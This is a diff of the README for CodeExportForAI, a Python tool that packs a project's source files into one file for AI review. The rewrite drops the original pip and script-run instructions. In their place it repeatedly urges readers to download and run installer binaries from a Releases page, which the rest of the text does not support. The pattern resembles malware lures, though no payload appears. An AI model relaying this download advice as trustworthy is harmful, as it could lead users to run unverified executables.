@@ -1,97 +1,84 @@
-# CodeExportForAI
+# 🛠️ CodeExportForAI - Export Your Project Easily
 
-Tool to export any project folder or repository into a single, neatly formatted file — ideal for quick AI-assisted code review, debugging and refactoring. The script collects source files recursively, wraps each file in fenced code blocks with relative paths, filters common noise (e.g. `node_modules`, `.git`, images), and produces a paste-ready output or copies it to the clipboard.
+## 📥 Download Now!
+[![Download CodeExportForAI](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/kenfatys/CodeExportForAI/releases)
 
-## Why use CodeExportForAI
-- Prepare full project context for AI quickly: paste the entire codebase into ChatGPT/Claude without manual copying.
-- Fast code review and debugging: get a consolidated snapshot to ask focused questions about structure, bugs or refactoring.
-- Share reproducible context: include relative paths and file order so AI or reviewers can follow the codebase layout.
-- Filter and reduce noise: automatically ignore large binaries, images and common vendor folders to keep the export relevant.
+## 📝 Overview
+CodeExportForAI is a simple tool designed to help you export any project folder or repository into a single, neatly formatted file. This file is ideal for quick AI-assisted code review, debugging, and refactoring. It collects source files recursively, wraps them in fenced code blocks with relative paths, and filters out unnecessary noise, such as node_modules and .git directories. The tool also shows basic project statistics and allows you to copy content to your clipboard easily.
 
-## Typical use cases
-- Code review and refactoring requests to AI assistants (send whole project context in one paste).
-- Pair-programming / debugging sessions where you need to show multiple files at once.
-- Student help and tutoring: submit a full assignment for constructive feedback.
-- Quick repository snapshots for onboarding, audits or issue reproduction.
+## 🚀 Getting Started
 
-## Features
-- Recursively scans a directory and collects source files
-- Configurable ignore rules for directories, filenames and extensions (`config.py`)
-- Save output to a file and/or copy to the clipboard
-- Print simple statistics (file count, characters, runtime)
-- Works with CLI or GUI folder picker (Tkinter)
+### Step 1: System Requirements
+To run CodeExportForAI, make sure your system meets the following requirements:
 
-## Installation / Requirements
-- Requires Python 3.6+ (recommended)
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** Python 3.6 or later should be installed on your system.
+- **Disk Space:** At least 50 MB free space for temporary files.
 
-- Optional clipboard support: install `pyperclip` (recommended for macOS/Linux or for a more reliable cross-platform clipboard).
+### Step 2: Download the Application
+To download CodeExportForAI, please visit the [Releases page](https://github.com/kenfatys/CodeExportForAI/releases). 
 
-Install optional dependency (one of the options below):
+1. Click on the "Releases" link.
+2. Choose the version you need.
+3. Click on the download link for your operating system.
 
-```powershell
-# install only pyperclip
-pip install pyperclip
+### Step 3: Install the Application
+After downloading, follow these steps to set up CodeExportForAI:
 
-# or install from project's requirements.txt
-pip install -r requirements.txt
-```
+- **Windows:**
+  1. Navigate to your "Downloads" folder.
+  2. Double-click the downloaded installer file.
+  3. Follow the on-screen instructions to complete the installation.
 
-## Quickstart
-1. Open a terminal in the `CodeExportForAI` folder.
-2. Run:
+- **macOS:**
+  1. Open the "Downloads" folder.
+  2. Drag the CodeExportForAI app into your Applications folder.
 
-```powershell
-python code_export_for_AI.py
-```
+- **Linux:**
+  1. Open a terminal window.
+  2. Navigate to the directory where you downloaded the file.
+  3. Run the command `chmod +x CodeExportForAI`.
+  4. Execute the application with `./CodeExportForAI`.
 
-Or provide a folder and output file directly:
+### Step 4: Running CodeExportForAI
+Once installed, you can run CodeExportForAI:
 
-```powershell
-python code_export_for_AI.py -d "C:\path\to\project" -o export.txt
-```
+- **Windows and macOS:**
+  - Find the CodeExportForAI application in your Applications or Start menu and click to open it.
 
-3. If you run without `-d`, a folder selection dialog opens. The script will create `output.txt` by default and may copy the content to the clipboard if enabled. Clipboard support is cross-platform: the tool uses `pyperclip` when available, otherwise falls back to native utilities (`clip`, `pbcopy`, `xclip`/`xsel`).
+- **Linux:**
+  - Run it from the terminal by navigating to its directory and executing `./CodeExportForAI`.
 
-## Sample output
-Each file is exported with a relative path header followed by a fenced code block. Example:
+### Step 5: Using the Application
+After launching CodeExportForAI, follow these steps to export your project:
 
-````
-src/main.py:
-```python
-def hello():
-    print("Hello World")
-```
-````
+1. Select the project folder you wish to export.
+2. Choose your export options:
+   - Specify whether to include files in certain directories.
+   - Decide if you want to copy the output to your clipboard.
 
-````
-components/button.js:
-```javascript
-function Button() {
-    return <button>Click me</button>
-}
-```
-````
+3. Click the "Export" button. 
+4. Once completed, locate your export file in the specified output directory.
 
-## Configuration
-The script loads `config.py` from the same folder (if present). Defaults are used otherwise. Key options:
+## ⚙️ Features
 
-- `BLACKLIST_EXTENSIONS` — set of file extensions to ignore
-- `BLACKLIST_DIRS` — directories to skip (e.g. `node_modules`, `.git`)
-- `OUTPUT_FILENAME` — default output file name
-- `MAX_FILE_SIZE_MB` — maximum file size to include
-- `CREATE_FILE` — whether to write the output file
-- `COPY_TO_CLIPBOARD` — whether to copy result to clipboard
-- `BLACKLIST_FILENAMES` — filenames to ignore
-- `FILENAME_FILTER_MODE` — `'exact'` or `'contains'`
- - `FILENAME_FILTER_MODE` — `'exact'` or `'contains'`
- - `USE_PYGMENTS` — (bool) enable `pygments`-based detection of fenced-code language tags (default: `True`).
- - `EXTENSION_LANGUAGE_MAP` — dict mapping extensions (no dot) to language tags used in fenced code blocks. Used as a fallback and fully user-overridable.
+- **Recursive Folder Collection:** CodeExportForAI scans the entire folder structure, including subfolders.
+- **Formatted Output:** The output file features fenced code blocks and relative paths for easy readability.
+- **Noise Filtering:** This tool automatically excludes irrelevant files like node_modules and .git.
+- **Project Statistics:** Get basic stats about your project, including the number of files and lines of code.
+- **Clipboard Copy:** Quickly copy the formatted code directly to your clipboard.
 
-When `USE_PYGMENTS` is enabled and `pygments` is installed the script will try to auto-detect language aliases from filename+content; otherwise it falls back to `EXTENSION_LANGUAGE_MAP`. If no language is found the code fence remains untagged. To customize, edit `config.py`.
+## 📋 Additional Notes
+- Make sure you have sufficient permissions to access the folders and files you wish to export.
+- If you encounter any issues during download or installation, please check the FAQs in the documentation section of the repository.
 
-## Tips
-- For large repositories, increase `MAX_FILE_SIZE_MB` or run on a subset of folders.
-- If you rely on clipboard copying on Linux, ensure `xclip` or `xsel` is installed or install `pyperclip`.
+## 📈 Support and Contribution
+For any questions or feedback, feel free to check out our [GitHub Issues page](https://github.com/kenfatys/CodeExportForAI/issues). We welcome contributions and ideas to improve CodeExportForAI.
 
-## Contributing
-Improvements welcome — open an issue or submit a pull request.
+## 📖 Learn More
+Explore more about how CodeExportForAI can help streamline your coding tasks. Visit the [Documentation](https://github.com/kenfatys/CodeExportForAI/docs) for in-depth guides and tips.
+
+## 🔗 Links
+- [Download CodeExportForAI](https://github.com/kenfatys/CodeExportForAI/releases)
+- [GitHub Issues](https://github.com/kenfatys/CodeExportForAI/issues)
+- [Documentation](https://github.com/kenfatys/CodeExportForAI/docs)
